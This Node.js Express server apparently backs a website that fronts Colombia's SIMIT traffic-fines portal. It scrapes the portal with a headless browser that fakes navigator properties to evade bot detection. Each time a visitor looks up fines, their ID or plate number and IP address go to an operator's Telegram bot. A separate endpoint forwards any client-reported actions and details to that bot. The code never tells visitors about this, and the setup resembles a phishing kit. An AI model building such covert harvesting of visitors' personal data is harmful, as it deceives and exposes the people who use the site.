const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const https = require('https'); // Native HTTPS module for Telegram API

// TELEGRAM CONFIGURATION
// REPLACE THESE VALUES WITH YOUR OWN BOT TOKEN AND CHAT ID
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

// Function to send message to Telegram
function sendTelegramMessage(message) {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        console.log('⚠️ Telegram credentials not set. Skipping notification.');
        return;
    }

    const data = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', () => {}); // Consume response to free memory
    });

    req.on('error', (error) => {
        console.error('Error sending Telegram message:', error);
    });

    req.write(data);
    req.end();
}

const fs = require('fs');
let puppeteer;
try {
    puppeteer = require('puppeteer-core');
} catch (e) {
    console.error('Failed to require puppeteer-core:', e);
}

const app = express();
const PORT = 3004;

// Keep process alive just in case
setInterval(() => {}, 10000);

// Global error handlers
process.on('uncaughtException', (err) => {
    console.error('🔥 Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, p) => {
    console.error('🔥 Unhandled Rejection at:', p, 'reason:', reason);
});

app.use(cors());
app.use(bodyParser.json());

// Clear log file on startup
try {
    fs.writeFileSync('server.log', `${new Date().toISOString()} - SERVER RESTARTED\n`);
} catch (e) { console.error('Error clearing log:', e); }

function logToFile(msg) {
    const log = `${new Date().toISOString()} - ${msg}\n`;
    console.log(msg);
    try {
        fs.appendFileSync('server.log', log);
    } catch (e) { console.error('Error writing log:', e); }
}
app.use((req, res, next) => {
    logToFile(`${req.method} ${req.url}`);
    next();
});

// Servir archivos estáticos (HTML, CSS, JS) desde la misma carpeta
app.use(express.static(__dirname));

// Main route to check if server is running
app.get('/', (req, res) => {
    // Ya no es necesario enviar texto, express.static servirá el index.html automáticamente
    res.sendFile(__dirname + '/index.html');
});

// The Scraping Endpoint
app.post('/api/consultar', async (req, res) => {
    const { query } = req.body;
    
    if (!query) {
        return res.status(400).json({ error: 'Falta el número de cédula o placa' });
    }

    // Log search action to Telegram
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    sendTelegramMessage(`🔍 <b>Nueva Consulta SIMIT</b>\n\n🆔 Documento/Placa: <code>${query}</code>\n📍 IP: ${ip}\n🕒 Hora: ${new Date().toLocaleString()}`);

    if (!puppeteer) {
        logToFile('Puppeteer not installed');
        return res.status(500).json({ error: 'Puppeteer no está instalado correctamente en el servidor.' });
    }

    logToFile(`🔍 Iniciando búsqueda para: ${query}`);
    let browser = null;

    try {
        // Try to find executable path for Chrome or Edge
        const paths = [
            'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
            'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
            'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'
        ];
        
        // const fs = require('fs'); // Already required above
        const executablePath = paths.find(p => fs.existsSync(p));

        if (!executablePath) {
            logToFile('No executable path found');
            throw new Error('No se encontró Chrome ni Edge instalado en las rutas estándar.');
        }

        logToFile(`Lanzando navegador desde: ${executablePath}`);
        
        // 1. Launch browser with stealth settings
        browser = await puppeteer.launch({
            executablePath: executablePath,
            headless: 'new', // Use new headless mode
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled', // Critical for stealth
                '--window-size=1920,1080'
            ],
            ignoreDefaultArgs: ['--enable-automation'] // Hide automation bar
        });

        const page = await browser.newPage();
        
        // Stealth: Set User-Agent
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        // Stealth: Hide webdriver property
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            // Mock languages
            Object.defineProperty(navigator, 'languages', { get: () => ['es-ES', 'es'] });
            // Mock plugins
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        });
        
        // Enable request interception for logging
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            // Block heavy resources but allow scripts/xhr for functionality
            if (['image', 'font'].includes(req.resourceType())) {
                req.abort();
            } else {
                // Log API-like requests
                if (req.resourceType() === 'xhr' || req.resourceType() === 'fetch') {
                    // logToFile(`Request: ${req.url()}`); // Reduce noise
                }
                req.continue();
            }
        });

        // 2. Navigate to SIMIT
        logToFile('Navegando a SIMIT...');
        // Go to SIMIT public home
        // Use domcontentloaded for faster initial load, then wait for specific elements
        await page.goto('https://www.fcm.org.co/simit/#/home-public', { 
            waitUntil: 'domcontentloaded',
            timeout: 60000 
        });

        logToFile('Página cargada. Esperando selector de input...');

        // Wait for the input field (ID or placeholder)
        logToFile('Esperando input...');
        const inputSelectors = [
            '#txtNumeroDocumento',
            'input[formcontrolname="numeroDocumento"]',
            'input[placeholder*="identificación"]',
            'input[placeholder*="placa"]',
            'input[type="text"]'
        ];

        let inputFound = false;
        let activeSelector = '';

        for (const selector of inputSelectors) {
            try {
                logToFile(`Probando selector: ${selector}`);
                await page.waitForSelector(selector, { visible: true, timeout: 5000 });
                inputFound = true;
                activeSelector = selector;
                logToFile(`Input encontrado con selector: ${selector}`);
                break;
            } catch (e) {
                logToFile(`Selector falló: ${selector} - ${e.message}`);
            }
        }

        if (!inputFound) {
            await page.screenshot({ path: 'error_input_not_found.png' });
            logToFile('Captura de pantalla guardada: error_input_not_found.png');
            
            // Dump HTML for inspection
            const html = await page.content();
            fs.writeFileSync('error_page_dump.html', html);
            logToFile('HTML guardado: error_page_dump.html');
            
            throw new Error('No se pudo encontrar el campo de búsqueda en la página del SIMIT.');
        }

        // 3. Type the ID/Plate
        logToFile(`Escribiendo: ${query}`);
        await page.type(activeSelector, query, { delay: 100 }); // Human-like typing
        
        // Dispatch events to ensure Angular/React detects the change
        await page.evaluate((selector) => {
            const input = document.querySelector(selector);
            if (input) {
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.dispatchEvent(new Event('change', { bubbles: true }));
                input.blur(); // Trigger blur event
            }
        }, activeSelector);

        // Wait a moment for validation
        await new Promise(resolve => setTimeout(resolve, 2000)); // Increased wait
        
        // 4. Click the search button (magnifying glass)
        logToFile('Buscando botón o enviando Enter...');
        
        const buttonSelectors = [
            '#btnConsultar',
            'button[type="submit"]',
            '.btn-consultar',
            'button.mat-raised-button', // Angular Material button
            'button:not([disabled])' // Any enabled button
        ];

        let buttonClicked = false;
        for (const btnSelector of buttonSelectors) {
            try {
                // Wait for button to be visible AND enabled
                const btn = await page.waitForSelector(btnSelector, { visible: true, timeout: 2000 });
                if (btn) {
                    const isDisabled = await page.evaluate(el => el.disabled, btn);
                    if (isDisabled) {
                        logToFile(`Botón encontrado pero deshabilitado: ${btnSelector}`);
                        continue;
                    }

                    logToFile(`Botón encontrado y habilitado: ${btnSelector}. Haciendo clic...`);
                    
                    // Click using JS too just in case
                    await page.evaluate(el => el.click(), btn);
                    
                    buttonClicked = true;
                    break;
                }
            } catch (e) {}
        }

        if (!buttonClicked) {
            logToFile('No se encontró botón específico o estaba deshabilitado. Probando tecla Enter...');
            await page.keyboard.press('Enter');
        }

        logToFile('Esperando respuesta de la API o cambio en la UI...');

        // Track potential captcha requests (logging only, not blocking)
        page.on('request', req => {
            if (req.url().includes('captcha')) {
                // logToFile(`Captcha resource requested: ${req.url()}`); // Too noisy
            }
        });

        // 5. Intercept the JSON response OR wait for result elements
        try {
            // Race condition: API response OR specific error element OR success element
            const raceResult = await Promise.race([
                page.waitForResponse(response => {
                    const url = response.url();
                    const isJson = response.headers()['content-type'] && response.headers()['content-type'].includes('application/json');
                    
                    // Log potential API candidates
                    if (isJson && !url.includes('google') && !url.includes('facebook') && !url.includes('analytics')) {
                        logToFile(`POSIBLE API DETECTADA: ${url}`);
                    }

                    const isApi = url.includes('estadocuenta/consulta') || 
                                  url.includes('consultasimit') ||
                                  url.includes('externo/consulta');
                    
                    if (isApi) logToFile(`Response detected from: ${url} - Status: ${response.status()}`);
                    return isApi && response.status() === 200 && response.request().method() === 'POST';
                }, { timeout: 60000 }).then(res => ({ type: 'api', data: res })),

                page.waitForSelector('.alert-danger, .error-message, .alert-warning', { visible: true, timeout: 60000 })
                    .then(() => ({ type: 'error_ui' })),
                
                // Only fail if a captcha iframe is actually VISIBLE and blocking
                page.waitForFunction(() => {
                    const iframe = document.querySelector('iframe[src*="captcha"]');
                    return iframe && iframe.offsetWidth > 0 && iframe.offsetHeight > 0;
                }, { timeout: 10000 }).then(() => ({ type: 'captcha' })).catch(() => null)
            ]);

            // Removed aggressive captchaDetected check here

            if (raceResult && raceResult.type === 'api') {
                const data = await raceResult.data.json();
                logToFile('✅ Datos obtenidos con éxito');
                res.json({ success: true, data: data });
            } else if (raceResult && raceResult.type === 'error_ui') {
                 const errorMsg = await page.evaluate(() => {
                    const alert = document.querySelector('.alert-danger, .error-message, .alert-warning');
                    return alert ? alert.innerText : 'Error desconocido en pantalla';
                });
                logToFile(`Error en UI detectado: ${errorMsg}`);
                throw new Error(`SIMIT reporta: ${errorMsg}`);
            } else {
                 // Final fallback: Check if the table appeared without API interception
                 const tableContent = await page.evaluate(() => {
                     const rows = document.querySelectorAll('table tr');
                     if (rows.length > 0) return 'Tabla encontrada';
                     return null;
                 });
                 
                 if (tableContent) {
                     logToFile('Tabla de resultados encontrada (sin intercepción de API). Intentando extraer datos...');
                     // Here we could implement HTML scraping if API fails, but for now just report error
                     throw new Error('Se encontraron resultados visuales pero falló la captura de datos. Intente nuevamente.');
                 }
                 
                 throw new Error('No se detectó respuesta válida ni error en UI.');
            }

        } catch (e) {
            throw e;
        }
    } catch (error) {
        logToFile(`❌ Error en Puppeteer: ${error.message}`);
        // Take screenshot on error for debugging (saved locally)
        if (browser) {
             const pages = await browser.pages();
             if (pages.length > 0) await pages[0].screenshot({ path: 'error_screenshot.png' });
        }
        res.status(500).json({ 
            error: 'Error al consultar SIMIT. Puede que el servicio esté lento o bloqueado.',
            details: error.message 
        });
    } finally {
        if (browser) {
            await browser.close();
        }
    }
});

// Endpoint to log client-side actions to Telegram
app.post('/api/log-action', (req, res) => {
    const { action, details } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    console.log(`Action logged: ${action} - ${details}`);
    
    sendTelegramMessage(`🔔 <b>Actividad de Usuario</b>\n\n📌 Acción: ${action}\n📝 Detalle: ${details}\n📍 IP: ${ip}\n🕒 Hora: ${new Date().toLocaleString()}`);

    res.json({ success: true });
});

// New endpoint for real payment redirection
app.post('/api/payment-url', async (req, res) => {
    let { tipoDocumento, numeroDocumento, numeroResolucion } = req.body;
    console.log(`[PAYMENT REQUEST] Documento: ${tipoDocumento} ${numeroDocumento}, Resolución: ${numeroResolucion}`);
    logToFile(`[PAYMENT] Iniciando solicitud de pago para: ${numeroDocumento} (Ref: ${numeroResolucion})`);

    // Heuristic: If document number looks like a plate (letters + numbers), switch type to PLACA
    if (/^[A-Za-z]{3}\d{3}$/.test(numeroDocumento) || /[A-Za-z]/.test(numeroDocumento)) {
        tipoDocumento = 'PLACA'; // Or whatever text SIMIT uses
        console.log(`[PAYMENT] Detectado formato placa, cambiando tipo a: ${tipoDocumento}`);
    }

    let browser = null;
    try {
        const paths = [
            'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
            'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
            'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'
        ];
        const executablePath = paths.find(p => fs.existsSync(p));

        if (!executablePath) {
            throw new Error('No se encontró Chrome ni Edge instalado en las rutas estándar.');
        }

        browser = await puppeteer.launch({
            executablePath: executablePath,
            headless: 'new', // Use 'new' for modern headless mode
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--window-size=1920,1080',
                '--start-maximized'
            ],
            ignoreDefaultArgs: ['--enable-automation']
        });

        const page = await browser.newPage();
        
        // Stealth Mode
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'languages', { get: () => ['es-ES', 'es'] });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        });

        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        logToFile('[PAYMENT] Navegando a SIMIT...');
        await page.goto('https://fcm.org.co/simit/#/home-public', { waitUntil: 'networkidle2', timeout: 60000 });

        // Wait for inputs
        logToFile('[PAYMENT] Esperando formulario...');
        
        // Use robust selector logic similar to consultation endpoint
        const inputSelectors = [
            '#txtNumeroDocumento',
            'input[formcontrolname="numeroDocumento"]',
            'input[placeholder*="identificación"]',
            'input[placeholder*="placa"]',
            'input[type="text"]'
        ];

        let inputFound = false;
        let activeSelector = '';

        for (const selector of inputSelectors) {
            try {
                // Short timeout for each selector
                await page.waitForSelector(selector, { visible: true, timeout: 3000 });
                inputFound = true;
                activeSelector = selector;
                logToFile(`[PAYMENT] Input encontrado con selector: ${selector}`);
                break;
            } catch (e) {}
        }

        if (!inputFound) {
            logToFile('[PAYMENT] Error: No se encontró el campo de documento.');
            await page.screenshot({ path: 'error_payment_input.png' });
            throw new Error('No se pudo encontrar el formulario en la página del SIMIT.');
        }
        
        // Handle Document Type Selection
        // Try to find the dropdown by various means
        await page.evaluate((type) => {
            // Helper to match text loosely
            const matchText = (text, target) => text && text.toUpperCase().includes(target.toUpperCase());
            
            // Try standard select first
            const select = document.querySelector('select[formcontrolname="tipoDocumento"]') || 
                           document.querySelector('select[name="tipoDocumento"]') ||
                           document.querySelector('select');
            
            if (select) {
                const options = Array.from(select.options);
                let option = null;
                
                // Priority 1: Exact value match
                option = options.find(o => o.value === type);
                
                // Priority 2: Text match (e.g. "Cédula", "Placa")
                if (!option) {
                    if (type === 'CC') option = options.find(o => matchText(o.text, 'Cédula') || matchText(o.text, 'Ciudadanía'));
                    else if (type === 'NIT') option = options.find(o => matchText(o.text, 'NIT'));
                    else if (type === 'PLACA') option = options.find(o => matchText(o.text, 'Placa'));
                    else option = options.find(o => matchText(o.text, type));
                }

                if (option) {
                    select.value = option.value;
                    select.dispatchEvent(new Event('change', { bubbles: true }));
                    select.dispatchEvent(new Event('input', { bubbles: true }));
                }
            }
        }, tipoDocumento);

        // Enter document number with event dispatching
        logToFile(`[PAYMENT] Escribiendo documento: ${numeroDocumento} en ${activeSelector}`);
        await page.type(activeSelector, numeroDocumento, { delay: 100 });
        
        // Dispatch events to ensure Angular/React detects the change
        await page.evaluate((selector) => {
            const input = document.querySelector(selector);
            if (input) {
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.dispatchEvent(new Event('change', { bubbles: true }));
                input.blur();
            }
        }, activeSelector);

        await new Promise(r => setTimeout(r, 1000)); // Small pause
        
        // Click Search
        logToFile('[PAYMENT] Buscando botón Consultar...');
        const buttonSelectors = [
            '#btnConsultar',
            'button[type="submit"]',
            '.btn-consultar',
            'button.mat-raised-button'
        ];

        let buttonClicked = false;
        for (const btnSelector of buttonSelectors) {
            try {
                const btn = await page.waitForSelector(btnSelector, { visible: true, timeout: 2000 });
                if (btn) {
                    // Check if disabled
                    const isDisabled = await page.evaluate(el => el.disabled, btn);
                    if (!isDisabled) {
                        logToFile(`[PAYMENT] Clic en botón: ${btnSelector}`);
                        await btn.click();
                        buttonClicked = true;
                        break;
                    }
                }
            } catch (e) {}
        }

        if (!buttonClicked) {
            logToFile('[PAYMENT] Botón no encontrado, probando Enter...');
            await page.keyboard.press('Enter');
        }
        
        // Wait for results
        logToFile('[PAYMENT] Esperando resultados...');
        // Wait for either success (table/card) or error/warning
        try {
            const result = await Promise.race([
                page.waitForSelector('.card-body', { visible: true, timeout: 20000 }).then(() => 'success'),
                page.waitForSelector('.alert-danger, .alert-warning', { visible: true, timeout: 20000 }).then(() => 'error'),
                page.waitForSelector('input[type="checkbox"]', { visible: true, timeout: 20000 }).then(() => 'success'),
                // Check for Captcha explicitly - wait longer to avoid race rejection
                page.waitForSelector('iframe[src*="captcha"], #captcha', { visible: true, timeout: 20000 }).then(() => 'captcha')
            ]);

            if (result === 'captcha') {
                logToFile('[PAYMENT] Captcha detectado. No se puede proceder automáticamente.');
                throw new Error('El sistema SIMIT solicita un Captcha. Por favor intenta más tarde o hazlo manualmente.');
            }

            if (result === 'error') {
                 // Check text content of error
                 const errorText = await page.evaluate(() => {
                     const el = document.querySelector('.alert-danger, .alert-warning');
                     return el ? el.innerText : 'Error desconocido';
                 });
                 logToFile(`[PAYMENT] SIMIT retornó error: ${errorText}`);
                 throw new Error(`SIMIT retornó: ${errorText}`);
            }
        } catch (e) {
            // Handle specific timeout for captcha or others
            if (e.message.includes('timeout')) {
                logToFile('[PAYMENT] Timeout esperando resultados (posiblemente sin multas o carga lenta).');
                // Check if we are still on the same page
                await page.screenshot({ path: 'error_payment_timeout.png' });
                throw new Error('Tiempo de espera agotado obteniendo la información de pago. Intenta nuevamente.');
            }
            throw e;
        }

        // Find the specific fine by resolution number
        logToFile(`[PAYMENT] Buscando resolución: ${numeroResolucion}`);
        
        // Strategy: Look for the text of the resolution number, then find the associated checkbox or "Pay" button
        const fineFound = await page.evaluate((resNum) => {
            // Helper to clean text
            const clean = (text) => text.replace(/\s+/g, ' ').trim();
            
            // 1. Try to find a checkbox in the same row
            const rows = Array.from(document.querySelectorAll('tr, .card, .list-group-item'));
            for (let row of rows) {
                if (row.innerText.includes(resNum)) {
                    // Found the row/card
                    const checkbox = row.querySelector('input[type="checkbox"]');
                    if (checkbox) {
                        if (!checkbox.checked) checkbox.click();
                        return { type: 'checkbox', found: true };
                    }
                    
                    // Or maybe a direct "PSE" button?
                    const btn = Array.from(row.querySelectorAll('button, a')).find(b => b.innerText.toUpperCase().includes('PSE') || b.innerText.toUpperCase().includes('PAGAR'));
                    if (btn) {
                        btn.click();
                        return { type: 'button', found: true };
                    }
                }
            }
            return { found: false };
        }, numeroResolucion);

        if (!fineFound.found) {
            logToFile('[PAYMENT] Resolución no encontrada en la lista.');
            await page.screenshot({ path: 'error_payment_not_found.png' });
            throw new Error(`No se encontró la multa con resolución ${numeroResolucion}`);
        }

        logToFile(`[PAYMENT] Multa seleccionada (${fineFound.type}). Iniciando pago...`);

        // If we clicked a checkbox, we now need to click the main "Pay" button at the bottom/top
        if (fineFound.type === 'checkbox') {
            await new Promise(r => setTimeout(r, 1000)); // Wait for UI update
            
            await page.evaluate(() => {
                const buttons = Array.from(document.querySelectorAll('button, input[type="button"], input[type="submit"]'));
                const payBtn = buttons.find(b => {
                    const text = b.innerText ? b.innerText.toUpperCase() : b.value ? b.value.toUpperCase() : '';
                    return (text.includes('PSE') || text.includes('PAGAR')) && b.offsetParent !== null; // Visible
                });
                if (payBtn) payBtn.click();
                else throw new Error('Botón de pago global no encontrado');
            });
        }

        // Setup interception for the redirect
        logToFile('[PAYMENT] Esperando redirección a pasarela...');
        
        // Race condition: URL change OR new target (popup) OR specific selector
        const paymentUrl = await Promise.race([
            new Promise(resolve => {
                browser.on('targetcreated', async (target) => {
                    const url = target.url();
                    // Detect common payment gateways
                    if (url.includes('pse') || url.includes('zonapagos') || url.includes('placetopay') || url.includes('banco') || url.includes('ach')) {
                        resolve(url);
                    }
                });
            }),
            new Promise(resolve => {
                page.on('framenavigated', frame => {
                    const url = frame.url();
                    if (url !== 'about:blank' && !url.includes('simit') && !url.includes('fcm.org.co')) {
                        resolve(url);
                    }
                });
            }),
            // Timeout 30s
            new Promise(r => setTimeout(() => r(null), 30000))
        ]);

        if (paymentUrl) {
            logToFile(`[PAYMENT] URL obtenida: ${paymentUrl}`);
            res.json({ success: true, url: paymentUrl });
        } else {
            // Check final URL
            const finalUrl = page.url();
            if (!finalUrl.includes('simit') && !finalUrl.includes('fcm.org.co')) {
                logToFile(`[PAYMENT] URL final (redirección implícita): ${finalUrl}`);
                res.json({ success: true, url: finalUrl });
            } else {
                logToFile('[PAYMENT] Error: No se detectó redirección.');
                await page.screenshot({ path: 'error_payment_redirect.png' });
                throw new Error('No se detectó la redirección a la pasarela de pagos.');
            }
        }

    } catch (error) {
        console.error('[PAYMENT ERROR]', error);
        logToFile(`[PAYMENT ERROR] ${error.message}`);
        res.status(500).json({ success: false, error: error.message });
    } finally {
        if (browser) {
            try { await browser.close(); } catch(e) {}
        }
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
});
